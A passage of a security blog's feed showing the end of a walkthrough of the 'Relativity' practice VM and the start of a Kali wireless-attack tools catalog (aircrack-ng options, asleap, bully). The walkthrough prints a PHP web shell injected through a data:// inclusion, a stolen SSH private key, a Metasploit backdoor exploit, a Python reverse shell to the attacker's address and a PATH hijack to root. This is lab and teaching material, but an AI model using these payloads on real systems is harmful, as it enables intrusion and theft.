</span><span class='line'># mini shell
</span><span class='line'>page=data://text/plain,&lt;?php system($_GET[cmd]);?&gt;&cmd=id
</span><span class='line'>
</span><span class='line'># base64 + URL encoded mini shell (didn't work without URL encoding)
</span><span class='line'>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id</span></code></pre></td></tr></table></div></figure>


<p>And we are free to enumerate! Next thing I did was to read <em>/etc/passwd</em> (look at it in the source code of the page for better readability). This gave me the name of 2 users on the machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---
</span><span class='line'>mauk:x:1001:1001::/home/mauk:/bin/bash
</span><span class='line'>jetta:x:1002:1002::/home/jetta:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Next I looked around some more, and when listing the home directories, I noticed that mauk&rsquo;s home folder permissions aren&rsquo;t what they should be (but good for us!):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>drwx------. 3 jetta jetta 4096 Jul  9  2013 jetta
</span><span class='line'>drwxr-xr-x. 3 mauk  mauk  4096 Jul  9  2013 mauk</span></code></pre></td></tr></table></div></figure>


<p>Looking in mauk&rsquo;s directory, this is interesting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh</span></code></pre></td></tr></table></div></figure>


<p>Even better, inside there is mauk&rsquo;s private SSH key!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r--r--. 1 mauk mauk 1679 Feb 24  2013 id_rsa
</span></code></pre></td></tr></table></div></figure>


<p>And we can read it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
</span><span class='line'>9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
</span><span class='line'>5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
</span><span class='line'>zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
</span><span class='line'>ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
</span><span class='line'>xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
</span><span class='line'>tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
</span><span class='line'>jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
</span><span class='line'>f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
</span><span class='line'>r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
</span><span class='line'>Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
</span><span class='line'>BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
</span><span class='line'>MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
</span><span class='line'>szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
</span><span class='line'>YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
</span><span class='line'>+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
</span><span class='line'>3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
</span><span class='line'>Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
</span><span class='line'>3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
</span><span class='line'>ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
</span><span class='line'>dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
</span><span class='line'>J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
</span><span class='line'>ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
</span><span class='line'>bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
</span><span class='line'>aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>


<p>We can save this private key on our machine and use it to log in as mauk! After looking around without any major discoveries, I noticed this folder in <em>/opt/</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[mauk@Relativity ~]$ ls -l /opt
</span><span class='line'>total 4
</span><span class='line'>drwx------ 13 jetta jetta 4096 May 20 18:32 Unreal</span></code></pre></td></tr></table></div></figure>


<p>That means there is an Unreal IRCd server there! But I didn&rsquo;t find one when port scanning. Looking at the listening programs, there is indeed an IRC server listening on localhost on port 6667:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[mauk@Relativity ~]$ netstat -lntp
</span><span class='line'>(No info could be read for "-p": geteuid()=1001 but you should be root.)
</span><span class='line'>Active Internet connections (only servers)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span><span class='line'>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span><span class='line'>tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>The ircd server might be an avenue for privilege escalation to jetta:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[mauk@Relativity ~]$ ps -u jetta
</span><span class='line'>  PID TTY          TIME CMD
</span><span class='line'>  557 ?        00:00:00 ircd</span></code></pre></td></tr></table></div></figure>


<p>But there was no netcat installed on the machine, so to find some information about the irc server, I set up SSH port forwarding so I can access it from my machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128 
</span><span class='line'>Last login: Sat May 23 18:25:04 2015 from 192.168.80.130
</span><span class='line'>[mauk@Relativity ~]$ </span></code></pre></td></tr></table></div></figure>


<p>And now I could port scan my local 4444 port to learn more:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -A -sV 127.0.0.1 4444
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-23 16:31 EEST
</span><span class='line'>setup_target: failed to determine route to 4444 (0.0.17.92)
</span><span class='line'>Nmap scan report for localhost (127.0.0.1)
</span><span class='line'>Host is up (0.000065s latency).
</span><span class='line'>Not shown: 999 closed ports
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>4444/tcp open  irc     Unreal ircd
</span><span class='line'>| irc-info: 
</span><span class='line'>|   server: relativity.localdomain
</span><span class='line'>|   version: Unreal3.2.8.1. relativity.localdomain 
</span><span class='line'>|   servers: 1
</span><span class='line'>|   users: 1
</span><span class='line'>|   lservers: 0
</span><span class='line'>|   lusers: 1
</span><span class='line'>|   uptime: 0 days, 0:51:08
</span><span class='line'>|   source host: rox-D2735CD4
</span><span class='line'>|_  source ident: nmap</span></code></pre></td></tr></table></div></figure>


<p>I googled the version and it contains a backdoor, and there is a Metasploit module for it. I fired up Metasploit and used against my localhost and port (remember the port forwarding), and got a shell as jetta! But if you want to know more about the backdoor and how to exploit it manually, read <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">this</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; run
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.80.130:5555 
</span><span class='line'>[*] Connected to 127.0.0.1:4444...
</span><span class='line'>    :relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
</span><span class='line'>[*] Sending backdoor command...
</span><span class='line'>[*] Command shell session 1 opened (192.168.80.130:5555 -&gt; 192.168.80.128:41061) at 2015-05-23 17:18:12 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>jetta</span></code></pre></td></tr></table></div></figure>


<p>In jetta&rsquo;s home directory there is a directory named <code>auth_server</code> with a binary inside. I ran <em>strings</em> on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>strings /home/jetta/auth_server/auth_server
</span><span class='line'>/lib64/ld-linux-x86-64.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>fflush
</span><span class='line'>puts
</span><span class='line'>putchar
</span><span class='line'>printf
</span><span class='line'>poll
</span><span class='line'>stdout
</span><span class='line'>system
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.2.5
</span><span class='line'>l$ L
</span><span class='line'>t$(L
</span><span class='line'>|$0H
</span><span class='line'>[+] Checking Certificates... 
</span><span class='line'>done
</span><span class='line'>[+] Contacting server, please wait... 
</span><span class='line'>could not establish connection
</span><span class='line'>invalid certificates
</span><span class='line'>error: (12)
</span><span class='line'>fortune -s | /usr/bin/cowsay
</span><span class='line'>Starting Auth server..
</span><span class='line'>;*3$"</span></code></pre></td></tr></table></div></figure>


<p>Interesting. This binary also appears to be owned as root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /home/jetta/auth_server/auth_server
</span><span class='line'>-rwxr-xr-x 1 root root 8010 Mar  8  2013 /home/jetta/auth_server/auth_server</span></code></pre></td></tr></table></div></figure>


<p>I tried to <em>sudo -l</em> to see if jetta can run any commands as root, but there was no output in my shell. So I checked if the shell I have is interactive using <a href="http://unix.stackexchange.com/questions/26676/how-to-check-if-a-shell-is-login-interactive-batch">this SO post</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[[ $- == *i* ]] && echo 'Interactive' || echo 'Not interactive'
</span><span class='line'>Not interactive</span></code></pre></td></tr></table></div></figure>


<p>I then read <a href="http://netsec.ws/?p=337">this post</a> about spawning a TTY shell and used the first of the choices for a proper shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'import pty; pty.spawn("/bin/sh")'
</span><span class='line'>sh-4.2$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for jetta on this host:
</span><span class='line'>    requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
</span><span class='line'>    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
</span><span class='line'>    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
</span><span class='line'>    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
</span><span class='line'>    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
</span><span class='line'>    XAUTHORITY PATH", env_reset
</span><span class='line'>
</span><span class='line'>User jetta may run the following commands on this host:
</span><span class='line'>    (root) NOPASSWD: /home/jetta/auth_server/auth_server</span></code></pre></td></tr></table></div></figure>


<p>Excellent, so the key to getting root is in exploiting that binary we found earlier. I ran it to see what it does:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ /home/jetta/auth_server/auth_server
</span><span class='line'>/home/jetta/auth_server/auth_server
</span><span class='line'>[+] Checking Certificates...done
</span><span class='line'>[+] Contacting server, please wait...could not establish connection
</span><span class='line'>error: (12)
</span><span class='line'> _________________________ 
</span><span class='line'>&lt; There isn't any problem &gt;
</span><span class='line'> ------------------------- 
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>


<p>I ran it several times for fun, made a mental note to replace my fortune cookies at the end of the blog posts with cowsay fortune cookies because this is purely awesome, then looked at <em>strings</em> again. Looking at the line <code>fortune -s | /usr/bin/cowsay</code>, we see that the <em>fortune</em> command doesn&rsquo;t use an absolute path. So we can create a program of our choosing called fortune and modify our PATH variable to start looking in the location of our program. At this point I tried several ways to get a local or reverse root shell but I kept getting errors that the fortune file is busy, so instead of running the exploit every time and then getting a TTY shell on top of it, I thought maybe I can log in directly as jetta now and work from there. So I made a <code>.ssh</code> directory inside jetta&rsquo;s home folder and copied there mauk&rsquo;s <code>authorized_keys</code> file (remember the permissions were too lax). So now I could directly ssh as jetta and try again for the shell.</p>

<p>This time I used a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Python reverse shell</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.130",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></td></tr></table></div></figure>


<p>I updated it with my host address and port, put it in a file named fortune, gave it permissions and updated  the  path to start looking in <em>/tmp/</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>[jetta@Relativity ~]$ chmod 777 /tmp/fortune
</span><span class='line'>
</span><span class='line'>[jetta@Relativity ~]$ export PATH="/tmp:$PATH"
</span><span class='line'>
</span><span class='line'>[jetta@Relativity ~]$ echo $PATH
</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/jetta/.local/bin:/home/jetta/bin</span></code></pre></td></tr></table></div></figure>


<p>On my machine I had netcat listen for connections:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 5555
</span><span class='line'>nc: listening on :: 5555 ...
</span><span class='line'>nc: listening on 0.0.0.0 5555 ...</span></code></pre></td></tr></table></div></figure>


<p>And now I ran <code>auth_server</code> again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
</span><span class='line'>[+] Checking Certificates...done
</span><span class='line'>[+] Contacting server, please wait...could not establish connection
</span><span class='line'>error: (12)</span></code></pre></td></tr></table></div></figure>


<p>And on my netcat side:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2# whoami
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'>sh-4.2# cat /root/flag.txt
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>65afa0e5928b98f7ae283e16df2d43bf</span></code></pre></td></tr></table></div></figure>


<p>Was curious about the hash, ran it in an online decrypter, the result was <em>sagishahar</em>.</p>

<p>Markdown formatting was a pain in the ass for cowsay, so a slightly different fortune cookie format, but straight from the cow&rsquo;s mouth!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/relativity/cookie.png" title="cookie" alt="fortune cowsay"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Wireless Attacks]]></title>
    <link href="http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks/"/>
    <updated>2015-04-20T09:31:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks</id>
    <content type="html"><![CDATA[<h3>802.11 Wireless Tools</h3>

<p><strong>aircrack-ng</strong></p>

<p>aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.
It can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the aircrack-ng  suite  determines
the  WEP key using two fundamental methods. The first method is via the
PTW approach (Pyshkin, Tews, Weinmann). The main advantage of  the  PTW
approach  is  that  very few data packets are required to crack the WEP
key. The second method is the FMS/KoreK method.  The  FMS/KoreK  method
incorporates  various  statistical  attacks to discover the WEP key and
uses these in combination with brute forcing.</p>

<!-- more -->


<p>Additionally, the program offers a dictionary  method  for  determining
the WEP key. For cracking WPA/WPA2 pre-shared keys, a wordlist (file or
stdin) or an airolib-ng has to be used.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  Aircrack-ng 1.2 rc1 - (C) 2006-2013 Thomas d'Otreppe
</span><span class='line'>  http://www.aircrack-ng.org
</span><span class='line'>
</span><span class='line'>  usage: aircrack-ng [options] &lt;.cap / .ivs file(s)&gt;
</span><span class='line'>
</span><span class='line'>  Common options:
</span><span class='line'>
</span><span class='line'>      -a &lt;amode&gt; : force attack mode (1/WEP, 2/WPA-PSK)
</span><span class='line'>      -e &lt;essid&gt; : target selection: network identifier
</span><span class='line'>      -b &lt;bssid&gt; : target selection: access point's MAC
</span><span class='line'>      -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)
</span><span class='line'>      -q         : enable quiet mode (no status output)
</span><span class='line'>      -C &lt;macs&gt;  : merge the given APs to a virtual one
</span><span class='line'>      -l &lt;file&gt;  : write key to file
</span><span class='line'>
</span><span class='line'>  Static WEP cracking options:
</span><span class='line'>
</span><span class='line'>      -c         : search alpha-numeric characters only
</span><span class='line'>      -t         : search binary coded decimal chr only
</span><span class='line'>      -h         : search the numeric key for Fritz!BOX
</span><span class='line'>      -d &lt;mask&gt;  : use masking of the key (A1:XX:CF:YY)
</span><span class='line'>      -m &lt;maddr&gt; : MAC address to filter usable packets
</span><span class='line'>      -n &lt;nbits&gt; : WEP key length :  64/128/152/256/512
</span><span class='line'>      -i &lt;index&gt; : WEP key index (1 to 4), default: any
</span><span class='line'>      -f &lt;fudge&gt; : bruteforce fudge factor,  default: 2
</span><span class='line'>      -k &lt;korek&gt; : disable one attack method  (1 to 17)
</span><span class='line'>      -x or -x0  : disable bruteforce for last keybytes
</span><span class='line'>      -x1        : last keybyte bruteforcing  (default)
</span><span class='line'>      -x2        : enable last  2 keybytes bruteforcing
</span><span class='line'>      -y         : experimental  single bruteforce mode
</span><span class='line'>      -K         : use only old KoreK attacks (pre-PTW)
</span><span class='line'>      -s         : show the key in ASCII while cracking
</span><span class='line'>      -M &lt;num&gt;   : specify maximum number of IVs to use
</span><span class='line'>      -D         : WEP decloak, skips broken keystreams
</span><span class='line'>      -P &lt;num&gt;   : PTW debug:  1: disable Klein, 2: PTW
</span><span class='line'>      -1         : run only 1 try to crack key with PTW
</span><span class='line'>
</span><span class='line'>  WEP and WPA-PSK cracking options:
</span><span class='line'>
</span><span class='line'>      -w &lt;words&gt; : path to wordlist(s) filename(s)
</span><span class='line'>
</span><span class='line'>  WPA-PSK options:
</span><span class='line'>
</span><span class='line'>      -E &lt;file&gt;  : create EWSA Project file v3
</span><span class='line'>      -J &lt;file&gt;  : create Hashcat Capture file
</span><span class='line'>      -S         : WPA cracking speed test
</span><span class='line'>      -r &lt;DB&gt;    : path to airolib-ng database
</span><span class='line'>                   (Cannot be used with -w)
</span><span class='line'>
</span><span class='line'>  Other options:
</span><span class='line'>
</span><span class='line'>      -u         : Displays # of CPUs & MMX/SSE support
</span><span class='line'>      --help     : Displays this usage screen</span></code></pre></td></tr></table></div></figure>


<p><strong>asleap</strong></p>

<p>Actively recover LEAP/PPTP passwords</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/asleap.png" title="asleap" alt="asleap"></p>

<p><strong>bully</strong></p>

<p>Bully is a new implementation of the WPS brute force attack, written in C. It is conceptually identical to other programs, in that it exploits the (now well known) design flaw in the WPS specification. It has several advantages over the original reaver code. These include fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture.</p>

<p>Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
